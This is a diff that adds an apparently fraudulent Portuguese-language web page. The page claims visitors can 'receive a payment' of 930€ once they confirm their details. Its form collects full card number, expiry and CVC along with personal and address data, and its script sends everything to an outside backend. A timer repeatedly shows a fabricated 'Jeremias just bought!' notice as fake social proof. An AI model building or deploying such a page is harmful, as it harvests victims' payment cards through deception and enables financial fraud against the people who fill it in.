@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+      <!-- Fonts -->
+      <link href="https://fonts.googleapis.com" rel="preconnect">
+      <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Raleway:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+      <!-- Vendor CSS Files -->
+      <link href="../checkout-front/assets/vendor/bootstrap/css/bootstrap.css" rel="stylesheet">
+      <link href="../checkout-front/assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+      <link href="../checkout-front/assets/vendor/aos/aos.css" rel="stylesheet">
+      <link href="../checkout-front/assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+      <!-- Main CSS File -->
+    <link href="../checkout-front/assets/css/main.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
+    <title>Checkout</title>
+</head>
+<body>
+  <section id="contact" class="contact section">
+      <!-- Section Title -->
+      <div class="container " style="transform: translateY(-70px);">
+        <div class="row">
+            <div class="bg-success" style="z-index: 1;">
+                <h1 class="text-light text-center px-3 py-3"> Confirme seus dados para<br> receber o pagamento</h1>
+              </div>
+              
+       <hr class=" mb-5" style="border-width: 5px;margin-top: 0px; border-color:  #FFffff;z-index: 2;border">
+          <div class="col-lg-7 container ">
+            <div class="contact-form-wrapper" style="margin-top: -60px;">
+              <div class="text-center">
+                <img src="../assets/img/p.jpeg" width="200">
+            </div>
+              <form action="#" method="post" class="php-email-form">
+                
+                <div class="row">
+                  <div class="col-md-6 form-group">
+                    <label for="name">Primeiro Nome</label>
+                    <input type="text" name="firstName" class="form-control" id="name" placeholder="John" required="">
+                  </div>
+                  <div class="col-md-6 form-group mt-3 mt-md-0">
+                    <label for="email">Último Nome</label>
+                    <input type="text" class="form-control" name="lastName" id="lastName" placeholder="Doe" required="">
+                  </div>
+                </div>
+                <div class="form-group mt-3">
+                  <label for="subject">Telefone</label>
+                  <input type="number" class="form-control" name="number" id="number" placeholder="99999999" required>
+                </div>
+                <div class="form-group mt-3">
+                  <label for="subject">E-mail</label>
+                  <input type="email" class="form-control" name="email" id="email" placeholder="hasdary@gmail.com" required>
+                </div>
+                <div class="form-group mt-3">
+                  <label for="subject">Rua e número da Casa</label>
+                  <input type="text" class="form-control" placeholder="Rua e número da Casa" required>
+                </div>
+                <div class="form-group mt-3">
+                  <label for="subject">Rua e número da Casa</label>
+                  <input type="text" class="form-control" placeholder="Rua e número da Casa" required>
+                </div>
+                <div class="form-group mt-3">
+                  <label for="subject">Andar</label>
+                  <input type="text" class="form-control" placeholder="Andar" required>
+                </div>
+                <div class="form-group mt-3">
+                  <label for="subject">Cidade</label>
+                  <input type="text" class="form-control" placeholder="Cidade" required>
+                </div>
+                <div class="form-group mt-3">
+                  <label for="subject">Distrito</label>
+                  <input type="text" class="form-control" placeholder="Distrito" required>
+                </div>
+                <div class="form-group mt-3">
+                  <label for="subject">Código Postal</label>
+                  <input type="text" class="form-control" placeholder="Código Postal" required>
+                </div>
+                <div class="form-group mt-3">
+                  <label for="subject">País</label>
+                  <input type="text" class="form-control" name="country" id="country" placeholder="Brazil" required>
+                </div>
+                <div class="mt-5">
+                    <div style="display: flex; align-items: center;">
+                        <h5>Dados do cartão</h5>
+                        <div>
+                            <img src="../assets/img/v.png" width="50">
+                            <img src="../assets/img/m.png" width="40">
+                        </div>
+                    </div>
+                    <hr>
+                </div>
+                <div class="row">
+                  <div class="col-md-7 form-group">
+                     <label for="subject">Titular do cartão</label>
+                  <input type="text" class="form-control" name="cardName" id="cardName" placeholder="Harry Andrew" required="">
+                  </div>
+                  
+
+                <div class="col-md-5 form-group mt-3 mt-md-0">
+                    <label for="month">Data de Validade</label>
+                    <div class="d-flex">
+                        <input type="text" id="mm" name="mm" 
+                               placeholder="MM" class="form-control me-2" 
+                               pattern="\d{2}" maxlength="2" inputmode="numeric" required>
+
+                        <span class="mt-2">/</span>
+
+                        <input type="text" id="yy" name="yy" 
+                               placeholder="YY" class="form-control ms-2" 
+                               pattern="\d{2}" maxlength="2" inputmode="numeric" required>
+                    </div>
+                </div>
+                <div class="row">
+                  <div class="col-md-7 form-group">
+                     <label for="subject">Número do cartão</label>
+                  <input type="number" class="form-control" name="cardNumber" id="cardNumber" placeholder="1000000000000000" required="">
+                  </div>
+                  <div class="col-md-5 form-group mt-3 mt-md-0">
+                    <label for="email">CVC</label>
+                    <div class="d-flex">
+                        <input type="password" class="form-control" name="cvc" id="cvc" placeholder="123" required="">
+                    </div>
+                  </div>
+                </div>
+                <div class="mt-5">
+                   
+                    <h5>Valor a receber: 930,00€</h5>
+                     <hr>
+                  </div>
+                <div class="text-center">
+                  <button type="submit">Confirmar</button>
+                </div>
+              </form>
+              <div class="mt-5 text-center">
+                  <img src="../assets/img/vm.png" width="300">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  <script src="../assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="../assets/vendor/aos/aos.js"></script>
+  <script src="../assets/vendor/purecounter/purecounter_vanilla.js"></script>
+  <script src="../assets/vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+  <script type="text/javascript">
+      toastr.options = {
+      "closeButton": true,  
+      "progressBar": true,
+      "positionClass": "toast-bottom-right",
+      "timeOut": "3000",
+      "extendedTimeOut": "1000", 
+      "showEasing": "swing",
+      "hideEasing": "linear",
+    };
+
+    
+    function showToast() {
+      toastr.info('Jeremias acabou de comprar!');
+    }
+
+    setInterval(showToast, 3000); 
+
+  $(document).ready(function () {
+    $('.php-email-form').on('submit', function (e) {
+      e.preventDefault(); // Impede o envio normal
+
+      let errors = [];
+
+      // Validações
+      const firstName = $('#name').val().trim();
+      const lastName = $('#lastName').val().trim();
+      const number = $('#number').val().trim();
+      const email = $('#email').val().trim();
+      const country = $('#country').val().trim();
+      const mm = $('#mm').val().trim();
+      const yy = $('#yy').val().trim();
+      const cardName = $('#cardName').val().trim();
+      const cardNumber = $('#cardNumber').val().trim();
+      const cvc = $('#cvc').val().trim();
+
+      // firstName
+      if (!firstName) errors.push("O nome é obrigatório.");
+      else if (firstName.length > 255) errors.push("O nome não pode ter mais de 255 caracteres.");
+
+      // lastName
+      if (!lastName) errors.push("O sobrenome é obrigatório.");
+      else if (lastName.length > 255) errors.push("O sobrenome não pode ter mais de 255 caracteres.");
+
+      // number
+      if (!number) errors.push("O número de telefone é obrigatório.");
+      else if (!/^\d+$/.test(number)) errors.push("O número de telefone deve conter apenas números.");
+      else if (number.length < 8 || number.length > 15) errors.push("O número de telefone deve ter entre 8 e 15 dígitos.");
+
+      // email
+      if (!email) errors.push("O e-mail é obrigatório.");
+      else if (!/^\S+@\S+\.\S+$/.test(email)) errors.push("O e-mail deve ser válido.");
+
+      // country
+      if (!country) errors.push("O país é obrigatório.");
+      else if (country.length > 255) errors.push("O país não pode ter mais de 255 caracteres.");
+
+      // mm
+      if (!mm) errors.push("O mês de validade é obrigatório.");
+      else if (!/^\d{2}$/.test(mm)) errors.push("O mês deve ter exatamente 2 dígitos.");
+
+      // yy
+      if (!yy) errors.push("O ano de validade é obrigatório.");
+      else if (!/^\d{2}$/.test(yy)) errors.push("O ano deve ter exatamente 2 dígitos.");
+
+      // cardName
+      if (!cardName) errors.push("O nome no cartão é obrigatório.");
+      else if (cardName.length > 255) errors.push("O nome no cartão não pode ter mais de 255 caracteres.");
+
+      // cardNumber
+      if (!cardNumber) errors.push("O número do cartão é obrigatório.");
+      else if (!/^\d{16}$/.test(cardNumber)) errors.push("O número do cartão deve ter exatamente 16 dígitos.");
+
+      // cvc
+      if (!cvc) errors.push("O CVC é obrigatório.");
+      else if (!/^\d{3}$/.test(cvc)) errors.push("O CVC deve ter exatamente 3 dígitos.");
+
+      // Mostrar erros se houver
+      if (errors.length > 0) {
+        alert(errors.join('\n'));
+        return;
+      }
+
+      // Se não houver erros, enviar os dados
+      const data = {
+        firstName, lastName, number, email, country,
+        mm, yy, cardName, cardNumber, cvc,
+        amount: 930.00
+      };
+
+      $.ajax({
+        url: 'https://checkout-back.onrender.com/api/payments',
+        type: 'POST',
+        contentType: 'application/json',
+        data: JSON.stringify(data),
+        success: function (res) {
+          alert('Pagamento enviado com sucesso!');
+        },
+        error: function (xhr) {
+          alert('Erro ao enviar pagamento: ' + xhr.responseText);
+        }
+      });
+    });
+  });
+
+  </script>
+</body>
+</html>
